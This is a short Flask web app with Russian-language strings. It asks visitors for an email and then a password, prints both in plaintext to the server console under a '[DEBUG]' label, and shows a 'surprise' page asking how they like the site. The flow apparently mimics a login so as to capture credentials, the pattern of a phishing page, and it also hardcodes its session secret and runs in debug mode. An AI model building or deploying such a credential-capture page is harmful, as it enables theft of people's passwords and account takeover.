from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = 'секретный_ключ_для_сессий'

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        session['email'] = email
        return redirect(url_for('password'))
    return render_template('index.html')

@app.route('/password', methods=['GET', 'POST'])
def password():
    email = session.get('email')
    if not email:
        return redirect(url_for('index'))

    if request.method == 'POST':
        password = request.form['password']
        print(f"[DEBUG] Email: {email} | Password: {password}")
        return redirect(url_for('surprise'))

    return render_template('password.html', email=email)

@app.route('/surprise')
def surprise():
    return "<!DOCTYPE html><html lang='ru'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Сюрприз</title></head><body style='display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;font-size:24px;'>*Как тебе мой сайт*</body></html>"

if __name__ == '__main__':
    app.run(debug=True)